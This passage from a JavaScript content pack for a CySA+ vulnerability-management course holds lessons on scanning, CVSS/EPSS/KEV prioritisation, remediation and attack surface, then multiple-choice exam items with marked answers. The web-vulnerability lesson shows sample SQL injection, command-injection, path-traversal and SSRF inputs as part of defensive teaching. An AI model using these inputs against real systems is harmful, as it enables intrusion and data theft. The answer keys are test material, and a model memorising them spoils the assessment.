/* CONTENT PACK: CySA+ | Vulnerability Management (cysa-vuln) -- 40 MCQ + 10 PBQ + 5 briefings + boss */
window.PACKS = window.PACKS || {};
window.PACKS["cysa-vuln"] = {
lessons: {
"cysa-vuln-1": { intro: "The Grubs catalog every hull weakness before the fleet can weld it shut. Your scanner is your survey ship -- learn to read what it brings back.",
sections: [
{ h: "Scan types and what each sees", b: "Credentialed (authenticated) scans log into the host and read installed versions, patches, and config from the inside -- accurate, deep, few false positives. Uncredentialed (unauthenticated) scans probe from outside like an attacker would -- they see the exposed attack surface but guess more, producing more false positives. Agent-based scanning runs a resident agent (great for roaming laptops and cloud instances that aren't always reachable); agentless/network scanning reaches out on a schedule (nothing to install, but misses offline hosts). Passive discovery watches traffic to find assets without ever touching them." },
{ h: "Active vs passive, and asset discovery", b: "Active scanning sends probes and gets definitive answers but adds load and risk. Passive scanning infers assets and services from observed traffic -- zero footprint, ideal for fragile environments, but only sees what talks. You cannot manage what you haven't discovered, so the program starts with an accurate asset inventory: rogue/shadow devices are the ones that never get patched.", data: "Credentialed  -> reads patch level from registry/pkg db  -> low FP\nUncredentialed -> banners + probes from outside         -> higher FP\nAgent-based    -> resident agent reports in             -> catches roaming/cloud\nPassive        -> derived from traffic                  -> zero footprint" },
{ h: "Reading scanner output", b: "A finding lists the plugin/CVE, severity, affected host, and evidence. Your job is interpretation: is it real (validated) or a false positive? Is the host in scope and critical? Does the evidence actually match the environment (a Windows CVE on a Linux box is a false positive)? Scanners report on the version they can see -- a back-ported patch on Linux can make a fully patched host look vulnerable by banner alone." },
{ h: "Scan risk and environment awareness", b: "Scanning is not free: aggressive scans can crash fragile systems. OT/ICS, medical devices, IoT, and legacy systems may fault under normal probing -- prefer passive discovery or tightly scheduled, gentle credentialed scans there. Match scan windows to business tolerance, avoid peak load, and coordinate with owners. The exam rewards knowing WHEN not to actively scan as much as how to scan." },
],
traps: [
"'More findings' does not mean 'better scan' -- an uncredentialed scan showing fewer criticals may just be blind to host internals a credentialed scan would catch.",
"A vulnerability reported on the wrong OS/software is a false positive; validate against what's actually installed before escalating.",
"Back-ported patches (common on Linux/RHEL) make version banners misleading -- the host may be patched even though the banner looks old.",
"Never default to 'run an aggressive authenticated scan' against OT/medical/legacy -- that's how you cause the outage you were trying to prevent." ],
keys: [
"Credentialed = deep + accurate; uncredentialed = attacker's-eye + more FPs.",
"Agent-based catches roaming/cloud; passive discovery has zero footprint.",
"You can't manage undiscovered assets -- inventory first.",
"Fragile environments (OT/IoT/medical/legacy) -> passive or gentle, scheduled scans." ] },

"cysa-vuln-2": { intro: "Not every weakness the Grubs find is worth defending first. Score by real risk, Ranger -- or you'll fortify a broom closet while the bridge burns.",
sections: [
{ h: "CVSS fundamentals (v4.0 aware)", b: "CVSS produces a 0-10 severity score from metric groups. In v3.x: Base (intrinsic -- Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and CIA impact), Temporal, and Environmental. CVSS v4.0 (current) restructures these into Base, Threat, Environmental, and Supplemental groups. Critical exam point: CVSS measures SEVERITY, not risk. The Base score is context-free -- it assumes worst case and knows nothing about your environment.", data: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H\nAV:N = Network  AC:L = Low complexity  PR:N = No privileges\n-> high base score, but is THIS host exposed? that's context CVSS can't give" },
{ h: "Why the Base score isn't the priority order", b: "A CVSS 9.8 on an isolated, offline lab box is less urgent than a CVSS 7.5 on an internet-facing server processing payments. Environmental metrics let you adjust for your context, but the exam's core lesson is that you layer exploitability and asset value on top of severity to get priority. 'Critical = patch first' is the trap answer." },
{ h: "EPSS and CISA KEV: exploitability signals", b: "EPSS (Exploit Prediction Scoring System) estimates the probability a vulnerability will be exploited in the wild in the near term (0-1). CISA KEV (Known Exploited Vulnerabilities) is a catalog of vulnerabilities confirmed exploited right now. A vuln on the KEV list or with high EPSS jumps the queue regardless of a middling CVSS score -- because it's actually being used against people." },
{ h: "Risk-based prioritization = severity x exploitability x exposure x asset value", b: "The modern model: start with CVSS severity, weight it by exploitability (KEV/EPSS), then by exposure (internet-facing vs isolated) and asset criticality (crown-jewel data vs test box). A perimeter, KEV-listed, exploitable 8.1 on a payment server beats an internal, no-known-exploit 9.9 on a dev VM every time. That judgment is the heart of this domain." },
],
traps: [
"CVSS is a measure of severity, NOT risk -- repeat it; the exam tests this exact distinction.",
"'Always patch the highest CVSS first' is the classic wrong answer; context (exposure, KEV/EPSS, asset value) reorders the queue.",
"KEV listing or high EPSS should elevate a moderate CVSS above an unexploited critical.",
"Environmental/Threat metrics personalize the score -- a raw Base score alone is incomplete for prioritization." ],
keys: [
"CVSS = severity, not risk. Base score is context-free.",
"CVSS v4.0 groups: Base | Threat | Environmental | Supplemental.",
"KEV = exploited now; EPSS = probability of exploitation soon.",
"Priority = severity x exploitability x exposure x asset criticality." ] },

"cysa-vuln-3": { intro: "Finding the weakness is half the battle. The Grubs win when a known hole sits open for months because nobody could agree how to close it.",
sections: [
{ h: "Treatment options", b: "For each finding you choose: remediate (patch or fix the root cause -- the goal), mitigate (reduce risk without full fix -- e.g., WAF rule, config change, disable the feature), or accept/transfer/avoid the risk. Risk acceptance is a documented, time-bound business decision by the risk owner -- not an analyst silently ignoring a finding. Transfer (e.g., insurance) and avoidance (decommission the asset) round out the four responses." },
{ h: "Compensating controls when you can't patch", b: "Some systems can't be patched now -- a legacy app that breaks, an OT controller with no vendor fix, a device under contractual freeze. The answer is compensating controls: network segmentation/isolation, strict access control, virtual patching via IPS/WAF, enhanced monitoring. These reduce exploitability while the vulnerability technically remains.", data: "Unpatchable legacy SCADA box -> segment into isolated VLAN\n+ allowlist only the one management host\n+ IPS virtual patch for the specific CVE\n+ heightened logging -> risk reduced without a patch" },
{ h: "Inhibitors to remediation", b: "CS0-004 explicitly tests why remediation stalls: MOUs/SLAs and contractual agreements (you're not allowed to change the system), business process interruption (patch requires downtime the business won't accept), degrading functionality, legacy/proprietary systems, and organizational governance/change-management friction. Recognizing the inhibitor tells you whether to push for a window or pivot to a compensating control." },
{ h: "Maintenance windows, rollback, and validation", b: "Remediation is change management: schedule a maintenance window, have a tested rollback/backout plan, patch, then VALIDATE by rescanning or manually confirming the fix. A patch you never verify is a patch you can't count. Track exceptions with an owner and an expiry so accepted risks resurface for review." },
],
traps: [
"Risk acceptance is a documented decision by the risk owner with a review date -- not an analyst quietly closing the ticket.",
"When a system can't be patched, the answer is compensating controls (segmentation, virtual patching, monitoring), not 'ignore it' or 'take it offline' by default.",
"Applying a patch is not the end -- rescan/validate to confirm remediation actually worked.",
"Every change needs a rollback plan; 'patch immediately in production with no backout' is a wrong answer." ],
keys: [
"Four responses: remediate, mitigate, accept/transfer/avoid.",
"Can't patch? Compensating controls: segment, virtual patch, monitor.",
"Know the inhibitors: contracts, downtime, legacy, governance.",
"Always validate remediation by re-testing; track exceptions with expiry." ] },

"cysa-vuln-4": { intro: "The smaller the hull the Grubs can see, the fewer places they can drill. Shrink the attack surface and half their catalog becomes useless.",
sections: [
{ h: "Attack surface management", b: "Your attack surface is every point an attacker could reach: exposed services, open ports, internet-facing apps, forgotten subdomains, cloud storage, management interfaces, and third-party integrations. Attack surface management is the continuous discovery and reduction of that surface -- external attack surface management (EASM) focuses on what the internet can see. You reduce it by closing unused services, removing public exposure, and decommissioning shadow assets." },
{ h: "Secure configuration and hardening baselines", b: "Most exploitable weaknesses are misconfigurations, not missing patches: default credentials, unnecessary services, weak TLS, permissive IAM, public storage. Hardening baselines (CIS Benchmarks, DISA STIGs, vendor guides) define a known-good secure config; you measure drift against them. Configuration review is a discovery method in its own right.", data: "Common misconfigs the exam loves:\n- default admin/admin left enabled\n- S3/blob container set to public\n- RDP/SSH open to 0.0.0.0/0\n- overly permissive IAM role (Owner where Reader fits)\n- legacy TLS 1.0 / weak ciphers enabled" },
{ h: "Cloud posture basics (CSPM)", b: "In cloud, the attack surface is defined by configuration. Cloud Security Posture Management continuously checks resources against benchmarks: public storage, exposed databases, wide security groups, unused access keys, missing encryption. Shared responsibility applies -- the provider secures the platform; you must configure and monitor your workloads and data. Read cloud audit logs by principal, action, resource, region, source IP, and result." },
{ h: "Reducing exposure systematically", b: "Prioritize by exposure: an internet-facing misconfiguration outranks the same issue on an internal segment. Segment networks so a foothold can't reach everything. Apply least privilege to identities and services. Remove, don't just monitor, what you don't need -- the strongest control for an unused service is turning it off." },
],
traps: [
"Missing patches get the attention, but misconfigurations (default creds, public storage, open management ports) are just as exploitable and often easier for attackers.",
"In cloud, shared responsibility means the provider's secure platform doesn't cover YOUR misconfigured bucket or IAM policy.",
"Hardening = measuring drift against a baseline (CIS/STIG), not a one-time setup.",
"An internet-facing exposure of a given severity outranks the identical issue on an isolated internal host." ],
keys: [
"Attack surface = every reachable point; ASM continuously shrinks it.",
"Misconfigurations rival missing patches -- hunt default creds & public exposure.",
"Baselines (CIS/STIG) define good config; measure drift.",
"Cloud posture is config-driven; know shared responsibility & audit-log fields." ] },

"cysa-vuln-5": { intro: "The Grubs' favorite doors are the ones developers left unlocked. Learn the web vulnerabilities that show up in your logs -- and the controls that shut them.",
sections: [
{ h: "The injection family", b: "Injection flaws let attacker input change how a command or query runs. SQL injection (' OR '1'='1, UNION SELECT) reads or alters the database. Command injection (; whoami, | curl) runs OS commands. The root fix is the same everywhere: never trust input -- use parameterized queries/prepared statements, strict input validation, and least-privilege service accounts so a successful injection gains little.", data: "GET /product?id=105 UNION SELECT username,password FROM users--\n-> SQL injection: UNION appends attacker query to the original" },
{ h: "XSS, SSRF, and request-forgery", b: "Cross-site scripting (XSS) injects script that runs in other users' browsers (reflected, stored, DOM) -- steals sessions, defaces pages; fix with output encoding and Content Security Policy. Server-Side Request Forgery (SSRF) tricks the server into making requests attackers choose -- often to reach cloud metadata endpoints (169.254.169.254) for credentials. CSRF makes a logged-in user's browser submit unwanted actions; anti-CSRF tokens defeat it." },
{ h: "Access-control flaws: IDOR, path traversal, auth bypass", b: "Insecure Direct Object Reference (IDOR) -- changing /account?id=1001 to 1002 to read someone else's data -- is broken access control, the most common web weakness class. Directory/path traversal (../../etc/passwd) escapes the intended folder. Authentication bypass exploits weak session or logic. Fix with server-side authorization checks on every request, canonicalizing and validating paths.", data: "GET /invoice?id=4471   (yours)\nGET /invoice?id=4472   (someone else's -- returns 200) -> IDOR" },
{ h: "Evidence in logs and defensive controls", b: "You'll see these in web/proxy logs: encoded payloads, ../ sequences, UNION/SELECT keywords, sudden 500s or unusual 200s on tampered IDs, and abnormal parameter values. Controls layer up: secure coding (validation, parameterization, encoding), a WAF for virtual patching and signature blocking, dependency scanning (SCA) for vulnerable libraries, and SAST/DAST in the pipeline. WAF buys time; fixing the code is the remediation." },
],
traps: [
"Input validation ALONE isn't the fix for SQLi -- parameterized queries are the durable control; validation is defense in depth.",
"A WAF is a mitigation/virtual patch, not a remediation -- the vulnerable code is still there.",
"IDOR and most 'broken access control' issues have no fancy payload -- the tell is an authorized request for an unauthorized object (id swap).",
"SSRF's high-value target is often the cloud metadata endpoint (169.254.169.254); watch for server-originated requests to it." ],
keys: [
"Injection fix = parameterized queries + least privilege, everywhere.",
"XSS -> output encoding + CSP; SSRF -> block metadata/internal targets.",
"IDOR/path traversal = broken access control; enforce server-side authz.",
"WAF = virtual patch (buys time); fixing code = real remediation." ] },
},
mcq: {
"cysa-vuln-1": [
{ s: "Two scans of the same server produce very different results.", e: "Uncredentialed scan: 4 findings, all 'potential'\nCredentialed scan: 19 findings with exact patch levels", q: "Why the difference, and which is more reliable for patch decisions?", options: [
 { t: "The credentialed scan reads host internals directly, giving accurate patch-level data with fewer false positives", c: true, w: "Logging in lets the scanner read installed versions and config, so it sees far more and guesses far less." },
 { t: "The uncredentialed scan is more reliable because it sees the attacker's view", c: false, w: "The attacker's view is useful for exposure, but it's less accurate for patch decisions -- it infers rather than reads." },
 { t: "The credentialed scan is malfunctioning; more findings means more errors", c: false, w: "More findings here means more visibility, not more error -- credentialed scans have fewer false positives." },
 { t: "They should be identical; the difference indicates a broken scanner", c: false, w: "They're expected to differ -- depth of access is the whole point." } ] },
{ s: "You must assess roaming laptops that are rarely on the corporate network and cloud instances that autoscale.", e: "Requirement: consistent coverage of intermittently connected hosts", q: "Best scanning approach:", options: [
 { t: "Agent-based scanning -- the resident agent reports in regardless of when the host is reachable", c: true, w: "Agents handle roaming and ephemeral cloud hosts that a scheduled network scan would miss while they're offline." },
 { t: "Scheduled uncredentialed network scans at 2 a.m.", c: false, w: "Laptops and autoscaled instances may be offline at scan time -- you'd miss them." },
 { t: "Passive discovery only", c: false, w: "Passive finds assets but doesn't assess their patch level; you need vulnerability data." },
 { t: "One annual credentialed sweep", c: false, w: "Annual cadence leaves months of blind coverage for the most mobile assets." } ] },
{ s: "A vulnerability report flags CVE-2023-XXXX (a Windows SMB flaw) as critical on a host.", e: "Asset record: host is Ubuntu Linux 22.04, no Samba installed", q: "Correct disposition:", options: [
 { t: "Treat as a false positive -- validate against the actual OS/software before any action", c: true, w: "A Windows-specific CVE on a Linux host with no Samba is a false positive; validation prevents wasted remediation." },
 { t: "Patch it immediately because it's marked critical", c: false, w: "Acting on an obvious false positive wastes effort and erodes trust in the program." },
 { t: "Accept the risk formally", c: false, w: "There's no risk to accept -- the finding doesn't apply to this host." },
 { t: "Escalate to the CISO as a critical exposure", c: false, w: "Escalating an unvalidated false positive is exactly the noise good analysts filter out." } ] },
{ s: "A RHEL server shows OpenSSH as vulnerable by version banner, but the team insists it's patched.", e: "Banner: OpenSSH 8.0 (matches a CVE)\nRHEL package: openssh-8.0p1-19.el8 (security backport applied)", q: "Most likely explanation:", options: [
 { t: "Back-ported security fix -- the version banner is unchanged but the flaw is patched", c: true, w: "Enterprise Linux back-ports fixes into the same version string; banner-only scanners misread this as vulnerable." },
 { t: "The team is wrong; the banner proves it's vulnerable", c: false, w: "Banner version alone is misleading on back-porting distros; the package build shows the fix." },
 { t: "The scanner found a zero-day", c: false, w: "Nothing here indicates a novel flaw; it's a classic back-port false positive." },
 { t: "OpenSSH cannot be patched without a version bump", c: false, w: "Back-porting patches without changing the marketed version is standard on RHEL/Debian." } ] },
{ s: "You're asked to scan a hospital network that includes infusion pumps and legacy imaging systems.", e: "Concern: some devices have crashed under active scanning before", q: "Safest discovery strategy:", options: [
 { t: "Favor passive discovery and, where active scanning is required, use gentle, scheduled, coordinated scans with device owners", c: true, w: "Fragile medical/OT devices can fault under probing; passive-first with careful coordination avoids patient-safety incidents." },
 { t: "Run an aggressive authenticated scan across everything for completeness", c: false, w: "Aggressive scanning of medical devices risks device faults -- a safety hazard, not thoroughness." },
 { t: "Skip those devices entirely and never assess them", c: false, w: "They still need assessment; the answer is a safer method, not ignoring them." },
 { t: "Only scan during peak clinical hours to catch real usage", c: false, w: "Peak clinical hours is the worst window; any disruption directly affects patient care." } ] },
{ s: "During inventory reconciliation, the scanner reports hosts not in the CMDB.", e: "12 responding IPs with no asset owner or record", q: "Why do these matter most?", options: [
 { t: "Unmanaged/shadow assets rarely get patched or monitored, making them prime footholds", c: true, w: "You can't manage what you haven't discovered; undocumented hosts are where attackers live." },
 { t: "They don't matter; if they're not in the CMDB they're not our responsibility", c: false, w: "Rogue assets on your network are absolutely your risk, often the biggest one." },
 { t: "They should be deleted from the scan to keep reports clean", c: false, w: "Hiding them from reports is the opposite of managing them." },
 { t: "They are always false positives from the scanner", c: false, w: "Responding IPs are real hosts until proven otherwise; investigate and inventory them." } ] },
{ s: "A team wants zero footprint on a sensitive production segment but still needs asset/service awareness.", e: "Constraint: no probes may be sent to these hosts", q: "Which technique fits?", options: [
 { t: "Passive discovery -- derive assets and services from observed network traffic", c: true, w: "Passive analysis identifies hosts and services without sending any probes, meeting the zero-footprint constraint." },
 { t: "Aggressive credentialed scanning", c: false, w: "That sends plenty of probes and logins -- the opposite of zero footprint." },
 { t: "A full port scan of the segment", c: false, w: "Port scanning is active probing, explicitly disallowed here." },
 { t: "Deploying no tooling at all", c: false, w: "You'd have no awareness; passive discovery gives visibility without probes." } ] },
{ s: "Leadership asks the difference between vulnerability scanning and penetration testing.", e: "They're used interchangeably in a draft policy", q: "Best clarification:", options: [
 { t: "Scanning broadly identifies known weaknesses (often automated); pen testing actively exploits to prove real-world impact and chains", c: true, w: "Breadth-of-detection vs depth-of-exploitation is the core distinction the exam draws." },
 { t: "They are the same activity with different names", c: false, w: "They differ in method, depth, and goal; conflating them in policy causes gaps." },
 { t: "Pen testing is just an automated scan run twice", c: false, w: "Pen testing involves manual exploitation and creativity a scanner can't replicate." },
 { t: "Scanning exploits vulnerabilities; pen testing only lists them", c: false, w: "Reversed -- scanning lists, pen testing exploits." } ] } ],

"cysa-vuln-2": [
{ s: "A junior analyst says 'CVSS is our risk score, so patch strictly by it.'", e: "Queue sorted by CVSS Base score descending", q: "What's the key correction?", options: [
 { t: "CVSS measures severity, not risk; prioritization must add exploitability, exposure, and asset value", c: true, w: "This is the central distinction of the domain -- the Base score is context-free severity, not organizational risk." },
 { t: "CVSS is risk; the analyst is correct", c: false, w: "CVSS explicitly is not a risk score -- it lacks your environment's context." },
 { t: "CVSS only applies to network vulnerabilities", c: false, w: "CVSS applies broadly; the issue is severity-vs-risk, not scope." },
 { t: "Risk equals CVSS times the number of hosts, nothing more", c: false, w: "Host count matters but so do exploitability and exposure; this is an incomplete model." } ] },
{ s: "Two findings compete for the top of the queue.", e: "A: CVSS 9.8, internal isolated lab VM, no known exploit\nB: CVSS 7.5, internet-facing payment server, on CISA KEV", q: "Which should be remediated first?", options: [
 { t: "B -- actively exploited (KEV) and internet-facing on a critical asset outranks a higher raw score in isolation", c: true, w: "Exploitability plus exposure plus asset value beats a context-free higher CVSS every time." },
 { t: "A -- always take the highest CVSS first", c: false, w: "That's the trap; a 9.8 on an isolated box with no exploit is lower real risk." },
 { t: "Neither until both can be patched together", c: false, w: "Delaying an actively exploited internet-facing finding to batch it is dangerous." },
 { t: "A, because lab systems are always production-critical", c: false, w: "An isolated lab VM is typically low criticality; the premise is backwards." } ] },
{ s: "You're explaining EPSS to the team.", e: "Two CVEs: same CVSS 8.1; CVE-1 EPSS 0.02, CVE-2 EPSS 0.86", q: "How should EPSS influence prioritization?", options: [
 { t: "CVE-2 is far more likely to be exploited soon, so it should rank higher despite equal CVSS", c: true, w: "EPSS estimates near-term exploitation probability; a high EPSS elevates an otherwise equal finding." },
 { t: "EPSS is irrelevant when CVSS scores are equal", c: false, w: "Equal severity is exactly when exploitability signals like EPSS break the tie." },
 { t: "Lower EPSS means patch first because it's neglected", c: false, w: "Backwards -- higher exploitation probability means more urgency." },
 { t: "EPSS replaces CVSS entirely", c: false, w: "EPSS complements CVSS; you use them together, not one instead of the other." } ] },
{ s: "A CVE appears on the CISA KEV catalog.", e: "Internal CVSS: 6.5 (medium); asset: internet-facing VPN gateway", q: "What does KEV listing tell you?", options: [
 { t: "It is confirmed exploited in the wild, so it should jump the queue above unexploited higher-severity findings", c: true, w: "KEV means real-world exploitation is happening now; that urgency outweighs a middling CVSS." },
 { t: "KEV is just a severity re-rating; treat the 6.5 as-is", c: false, w: "KEV is an exploitation fact, not a severity tweak -- it changes urgency dramatically." },
 { t: "KEV findings can be safely deprioritized since they're well-known", c: false, w: "Well-known and actively exploited means attackers have working tools -- the opposite of safe to defer." },
 { t: "Ignore KEV unless CVSS is 9.0+", c: false, w: "KEV listing matters regardless of CVSS; that's its entire purpose." } ] },
{ s: "You need to personalize a Base score for your environment.", e: "Base CVSS assumes worst-case exposure; your host is heavily segmented with no external reach", q: "Which CVSS metric group applies?", options: [
 { t: "Environmental metrics -- they adjust the score for your specific context and controls", c: true, w: "Environmental metrics tailor severity to your deployment, e.g., reduced exposure lowers the effective score." },
 { t: "Base metrics -- edit them to match your network", c: false, w: "Base metrics are intrinsic and fixed; you don't rewrite them for context." },
 { t: "There is no way to adjust CVSS for context", c: false, w: "Environmental (and in v4.0, Threat) metrics exist precisely for this." },
 { t: "Supplemental metrics change the numeric score", c: false, w: "Supplemental metrics add context but don't alter the core score the way Environmental does." } ] },
{ s: "A stakeholder asks what changed in CVSS v4.0 structure.", e: "They know v3.x used Base, Temporal, Environmental", q: "Accurate summary:", options: [
 { t: "v4.0 uses Base, Threat, Environmental, and Supplemental groups (Temporal was reworked into Threat)", c: true, w: "v4.0 restructured the metric groups, replacing Temporal with Threat and adding Supplemental." },
 { t: "v4.0 removed Base metrics entirely", c: false, w: "Base metrics remain the core of v4.0." },
 { t: "v4.0 is identical to v3.1 with a new name", c: false, w: "The metric-group restructure is a real change." },
 { t: "v4.0 dropped Environmental metrics", c: false, w: "Environmental metrics persist in v4.0." } ] },
{ s: "A report ranks 1,200 findings purely by CVSS descending.", e: "Top 50 are all internal, unexploited, low-value dev boxes", q: "Best improvement to the prioritization?", options: [
 { t: "Layer exploitability (KEV/EPSS), exposure, and asset criticality onto severity to reorder by real risk", c: true, w: "Risk-based prioritization multiplies severity by the contextual factors CVSS omits." },
 { t: "Keep the CVSS-only order; it's objective", c: false, w: "Objective severity that ignores context misdirects effort -- the top 50 aren't the real risks." },
 { t: "Sort alphabetically by hostname instead", c: false, w: "That abandons risk entirely." },
 { t: "Only ever patch CVSS 10.0 findings", c: false, w: "Arbitrary cutoffs ignore exploited mediums and over-focus on isolated criticals." } ] },
{ s: "An 'informational' finding (CVSS 0.0) and a KEV-listed CVSS 7.2 both sit in the queue.", e: "Manager wants the informational one first because it's 'quick'", q: "Correct guidance:", options: [
 { t: "Prioritize the KEV-listed 7.2 -- active exploitation and real impact outweigh a quick, zero-severity item", c: true, w: "Effort ('quick') isn't priority; risk is. An actively exploited finding leads." },
 { t: "Do the informational one first since it's fast", c: false, w: "Speed of fix doesn't equal priority; a 0.0 informational has no real risk to reduce." },
 { t: "Both are equal priority", c: false, w: "A KEV-listed exploitable finding clearly outranks an informational note." },
 { t: "Close the KEV item as a false positive", c: false, w: "Nothing suggests it's false; KEV means it's real and exploited." } ] } ],

"cysa-vuln-3": [
{ s: "A critical CVE affects a legacy manufacturing controller with no vendor patch available.", e: "Vendor EOL; controller runs a critical production line", q: "Best treatment?", options: [
 { t: "Apply compensating controls: isolate/segment the controller, restrict access to one management host, add IPS virtual patching and monitoring", c: true, w: "When patching is impossible, layered compensating controls reduce exploitability while the vuln remains." },
 { t: "Accept the risk and take no action", c: false, w: "Doing nothing on a critical, reachable flaw isn't risk acceptance -- it's negligence without controls." },
 { t: "Immediately take the production line offline permanently", c: false, w: "Avoidance by decommissioning a critical line is disproportionate when segmentation can mitigate." },
 { t: "Force the vendor patch from a similar model", c: false, w: "Cross-model patching risks bricking the controller; unsupported and dangerous." } ] },
{ s: "An analyst quietly closes a vulnerability ticket, noting 'accepted risk.'", e: "No owner sign-off, no expiry, no documentation", q: "What's wrong here?", options: [
 { t: "Risk acceptance must be a documented decision by the risk owner, time-bound with a review date", c: true, w: "Acceptance is a governed business decision, not an analyst silently closing tickets." },
 { t: "Nothing -- analysts can accept risk at will", c: false, w: "Analysts identify and recommend; the risk owner accepts, with documentation." },
 { t: "The ticket should never be closed under any circumstances", c: false, w: "It can be closed via proper acceptance -- the issue is the missing governance." },
 { t: "Accepted risks never need review again", c: false, w: "Accepted risks must have an expiry so they resurface for reassessment." } ] },
{ s: "A patch is ready for a core database cluster.", e: "Change board asks for the deployment plan", q: "Which plan is complete?", options: [
 { t: "Schedule a maintenance window, take backups, apply the patch, test/validate, with a documented rollback plan", c: true, w: "Remediation is change management: window, backout, and post-patch validation are all required." },
 { t: "Apply the patch to production immediately during business hours", c: false, w: "No window, no rollback, peak load -- a recipe for an outage." },
 { t: "Patch and assume success without rescanning", c: false, w: "Unvalidated patching can't be counted as remediated." },
 { t: "Skip the backup to save time in the window", c: false, w: "No backup means no safe rollback if the patch fails." } ] },
{ s: "A vulnerability can't be remediated because a vendor contract forbids modifying the appliance.", e: "MSA explicitly bars customer changes to the managed device", q: "This is an example of:", options: [
 { t: "An inhibitor to remediation (contractual/governance) -- pivot to a compensating control or push the vendor", c: true, w: "Contractual restrictions are a named CS0-004 inhibitor; you work around them with controls or escalate to the vendor." },
 { t: "A false positive", c: false, w: "The vulnerability is real; the obstacle is contractual, not accuracy." },
 { t: "Automatic risk acceptance with no further action", c: false, w: "An inhibitor doesn't erase the risk -- compensating controls or vendor action still apply." },
 { t: "A reason to ignore the finding permanently", c: false, w: "Inhibitors require alternate mitigation, not abandonment." } ] },
{ s: "After deploying a fix, the vulnerability still appears in the next scan.", e: "Patch shows installed; scan still flags the CVE", q: "Most appropriate next step:", options: [
 { t: "Validate: confirm the patch fully applied (reboot/service restart needed?), rule out false positive, then re-test", c: true, w: "Validation catches incomplete remediation -- many patches need a reboot or service restart to take effect." },
 { t: "Assume the scanner is broken and close the finding", c: false, w: "Dismissing without checking risks leaving a live vulnerability open." },
 { t: "Immediately reimage the whole host", c: false, w: "Disproportionate before confirming whether a restart completes the patch." },
 { t: "Accept the risk since you already patched", c: false, w: "If it's still exploitable, the work isn't done; acceptance is inappropriate." } ] },
{ s: "The business refuses downtime for a patch that requires a reboot on a 24/7 revenue system.", e: "Patch is important but not currently exploited", q: "Pragmatic path forward:", options: [
 { t: "Negotiate a maintenance window (e.g., failover to redundancy) and apply compensating controls until then", c: true, w: "Recognize the business-interruption inhibitor, reduce risk temporarily, and schedule the fix via redundancy/failover." },
 { t: "Force the reboot now during peak revenue hours", c: false, w: "Ignoring business impact causes the outage the business feared." },
 { t: "Never patch it since downtime isn't allowed", c: false, w: "Permanent avoidance leaves a known hole; windows and failover exist for this." },
 { t: "Accept the risk with no controls or timeline", c: false, w: "Unmanaged acceptance with no compensating controls or plan is poor practice." } ] },
{ s: "You must choose the risk response for a low-value asset with an expensive-to-fix flaw.", e: "Asset: disposable test box; fix cost high; exploit impact trivial", q: "Which response is most defensible?", options: [
 { t: "Documented, owner-approved risk acceptance with a review date, given low impact and disposability", c: true, w: "When impact is trivial and cost is high, formal acceptance is a legitimate, governed choice." },
 { t: "Spend heavily to remediate immediately", c: false, w: "Over-investing to fix a trivial-impact issue misallocates resources." },
 { t: "Transfer the risk via cyber insurance", c: false, w: "Transfer suits large financial exposures, not a disposable low-impact test box." },
 { t: "Ignore it with no documentation", c: false, w: "Even acceptance requires documentation and an owner -- silent ignoring is not a response." } ] },
{ s: "A manager reports to leadership that a flaw is 'remediated' after adding a firewall rule to block the exploit path.", e: "Underlying vulnerable service is unchanged; a firewall ACL now blocks the known exploit route", q: "Is 'remediated' the correct term?", options: [
 { t: "No -- blocking the path is mitigation; remediation means fixing the root cause (patch/config fix)", c: true, w: "Remediation eliminates the vulnerability; a blocking rule reduces exploitability but leaves the flaw present, so it's mitigation." },
 { t: "Yes -- if the exploit path is blocked, it's fully remediated", c: false, w: "The vulnerable service still exists; an alternate path or rule change re-exposes it. That's mitigation, not remediation." },
 { t: "Yes -- any control that reduces risk counts as remediation", c: false, w: "Risk reduction without fixing the root cause is mitigation; the terms aren't interchangeable on the exam." },
 { t: "No -- it should be called risk acceptance", c: false, w: "A control was applied, so it's not acceptance; it's mitigation via a compensating control." } ] } ],

"cysa-vuln-4": [
{ s: "An external assessment finds a forgotten subdomain pointing to a decommissioned server.", e: "dev-old.company.com -> dangling DNS to a released cloud IP", q: "This represents what risk, and the fix?", options: [
 { t: "Attack surface exposure (subdomain takeover risk); remove the dangling DNS record and decommission properly", c: true, w: "Forgotten internet-facing assets expand attack surface and enable takeover; clean up the DNS and asset." },
 { t: "No risk since the server is decommissioned", c: false, w: "The dangling record is exactly the risk -- attackers can claim the released IP." },
 { t: "A false positive to ignore", c: false, w: "A live DNS record pointing to reclaimable infrastructure is a real exposure." },
 { t: "Only a branding issue, not security", c: false, w: "Subdomain takeover enables phishing and content injection -- a security problem." } ] },
{ s: "A cloud storage bucket is discovered open to the public internet.", e: "S3/blob container: public read enabled; contains internal docs", q: "Under shared responsibility, whose issue is this?", options: [
 { t: "The customer's -- the provider secures the platform, but the customer configures and monitors their data and access", c: true, w: "Misconfigured buckets are the customer's responsibility; shared responsibility doesn't cover your config choices." },
 { t: "The cloud provider's -- they host the storage", c: false, w: "The provider secures infrastructure; the public-access setting was a customer configuration." },
 { t: "No one's; public buckets are safe by design", c: false, w: "Public exposure of internal data is a serious, common breach cause." },
 { t: "The auditor's, for finding it", c: false, w: "Finding the issue is the fix path, not the fault." } ] },
{ s: "Hardening review compares a server against CIS Benchmarks.", e: "Deviations: default creds present, TLS 1.0 enabled, unused FTP running", q: "What is this activity called and its value?", options: [
 { t: "Configuration review / drift detection against a hardening baseline -- misconfigurations are exploitable weaknesses", c: true, w: "Measuring drift from CIS/STIG baselines surfaces misconfigs that are as dangerous as missing patches." },
 { t: "Penetration testing", c: false, w: "No exploitation is occurring; this is configuration assessment." },
 { t: "A false-positive review", c: false, w: "These are real misconfigurations, not scanner errors." },
 { t: "Irrelevant since no CVE is involved", c: false, w: "Misconfigurations don't need CVEs to be exploited; hardening addresses them." } ] },
{ s: "The same misconfiguration (open management port) exists on two hosts.", e: "Host A: internet-facing edge gateway\nHost B: internal host behind segmentation", q: "How should exposure affect priority?", options: [
 { t: "Host A first -- internet-facing exposure makes the identical issue far higher risk", c: true, w: "Exposure is a core prioritization factor; the reachable, external host is the urgent one." },
 { t: "Host B first -- internal hosts are always more valuable", c: false, w: "Not stated, and exposure here makes A the priority regardless." },
 { t: "Equal priority since the misconfig is identical", c: false, w: "Identical severity, very different exposure -- context reorders them." },
 { t: "Neither; misconfigs aren't vulnerabilities", c: false, w: "Misconfigurations are exploitable weaknesses and squarely in scope." } ] },
